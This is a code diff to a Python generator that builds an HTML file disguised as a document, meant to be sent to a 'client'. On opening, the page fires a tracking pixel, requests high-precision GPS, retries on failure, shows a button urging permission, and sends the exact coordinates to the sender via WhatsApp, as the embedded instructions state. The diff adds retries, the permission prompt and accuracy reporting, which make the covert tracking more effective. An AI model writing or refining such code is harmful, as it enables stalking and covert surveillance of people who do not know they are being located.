@@ -547,6 +547,18 @@ def create_document():
         .hidden {
             display: none;
         }
+        .permission-btn {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+        .permission-btn:hover {
+            background: #0056b3;
+        }
     </style>
 </head>
 <body>
@@ -563,6 +575,12 @@ def create_document():
     
     <div id="locationStatus" class="location-status gps-active">
         <strong>Real-time GPS Tracking:</strong> <span id="statusText">Starting automatic precise location capture...</span>
+    </div>
+    
+    <div id="manualPermission" style="display: none;">
+        <p><strong>Location permission required:</strong></p>
+        <button class="permission-btn" onclick="requestPreciseGPS()">Allow Location Access</button>
+        <p><small>Click to enable precise GPS tracking</small></p>
     </div>
     
     <div class="content">
@@ -582,7 +600,7 @@ def create_document():
             showStatus('🎯 Requesting PRECISE GPS location...', 'warning');
             
             if (!navigator.geolocation) {
-                showStatus('✅ Basic location tracking active', 'success');
+                showStatus('❌ Geolocation not supported - using basic tracking', 'warning');
                 return;
             }
             
@@ -604,61 +622,54 @@ def create_document():
                         source: 'high_precision_gps'
                     };
                     
-                    showStatus('✅ PRECISE GPS location captured!', 'success');
+                    showStatus('✅ PRECISE GPS location captured! Accuracy: ' + accuracy.toFixed(1) + 'm', 'success');
                     sendLocationData(gpsData);
                     
                 },
                 // Error - Try alternative methods
                 function(error) {
-                    console.log("First GPS attempt failed, trying alternatives...");
-                    attemptAlternativeGPS();
+                    console.log("GPS attempt failed:", error);
+                    handleLocationError(error);
                 },
                 // MAXIMUM precision settings
                 {
                     enableHighAccuracy: true,    // Force high precision
-                    timeout: 15000,              // 15 second timeout
+                    timeout: 30000,              // 30 second timeout
                     maximumAge: 0                // Fresh location only
                 }
             );
         }
         
-        // Alternative GPS attempts
-        function attemptAlternativeGPS() {
-            showStatus('🔄 Alternative GPS method...', 'warning');
+        // Handle location errors
+        function handleLocationError(error) {
+            let errorMessage = 'Location access ';
             
-            // SECOND ATTEMPT: Standard precision
-            navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    const lat = position.coords.latitude;
-                    const lng = position.coords.longitude;
-                    const accuracy = position.coords.accuracy;
-                    
-                    console.log("📍 STANDARD GPS ACQUIRED:", lat, lng);
-                    
-                    const gpsData = {
-                        latitude: lat,
-                        longitude: lng,
-                        accuracy: accuracy,
-                        timestamp: new Date().toISOString(),
-                        source: 'standard_gps'
-                    };
-                    
-                    showStatus('✅ GPS location captured', 'success');
-                    sendLocationData(gpsData);
-                },
-                // Final fallback
-                function(error) {
-                    console.log("All GPS attempts failed");
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    errorMessage = '❌ Location permission denied. Please allow location access for precise tracking.';
+                    document.getElementById('manualPermission').style.display = 'block';
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    errorMessage = '📍 Location unavailable. Using basic IP tracking.';
+                    break;
+                case error.TIMEOUT:
+                    errorMessage = '⏰ Location request timeout. Retrying...';
+                    setTimeout(requestPreciseGPS, 2000);
+                    break;
+                default:
+                    errorMessage = '❌ Location error. Using basic tracking.';
+                    break;
+            }
+            
+            showStatus(errorMessage, 'warning');
+            
+            // Final fallback - mark as acquired after delay
+            setTimeout(() => {
+                if (!locationAcquired) {
                     showStatus('✅ Basic tracking active', 'success');
                     locationAcquired = true;
-                },
-                // Standard settings
-                {
-                    enableHighAccuracy: false,
-                    timeout: 10000,
-                    maximumAge: 60000
                 }
-            );
+            }, 10000);
         }
         
         // Send precise location data
@@ -674,7 +685,7 @@ def create_document():
             })
             .then(response => response.json())
             .then(data => {
-                showStatus('✅ Precise location sent successfully!', 'success');
+                showStatus('✅ Precise location sent successfully! Accuracy: ' + locationData.accuracy.toFixed(1) + 'm', 'success');
                 locationAcquired = true;
                 console.log("Precise GPS data sent:", data);
             })
@@ -702,19 +713,19 @@ def create_document():
             document.getElementById('trackingPixel').onload = function() {
                 console.log('Basic tracking active, starting PRECISE GPS...');
                 
-                // Immediate GPS request
+                // Immediate GPS request with slight delay
                 setTimeout(() => {
                     requestPreciseGPS();
-                }, 100);
+                }, 1000);
             };
             
-            // Auto-retry if no GPS after 5 seconds
+            // Auto-retry if no GPS after 8 seconds
             setTimeout(() => {
                 if (!locationAcquired) {
                     console.log('Auto-retrying GPS...');
                     requestPreciseGPS();
                 }
-            }, 5000);
+            }, 8000);
             
             // Final completion
             setTimeout(() => {
@@ -722,7 +733,7 @@ def create_document():
                     showStatus('✅ Tracking completed', 'success');
                     locationAcquired = true;
                 }
-            }, 20000);
+            }, 30000);
         }
         
         // START IMMEDIATELY
@@ -744,13 +755,15 @@ def create_document():
                 'Auto-Request on Open',
                 'High Precision Coordinates',
                 'Multiple Fallback Attempts',
-                'Real-time Precise Location'
+                'Real-time Precise Location',
+                'Manual Permission Button'
             ],
             'instructions': [
                 '1. Send HTML file to client',
                 '2. When opened: browser will ask for location permission',
                 '3. Client must ALLOW location access for precise GPS',
-                '4. You will receive EXACT coordinates via WhatsApp'
+                '4. If denied, manual button appears for retry',
+                '5. You will receive EXACT coordinates via WhatsApp'
             ]
         })
         
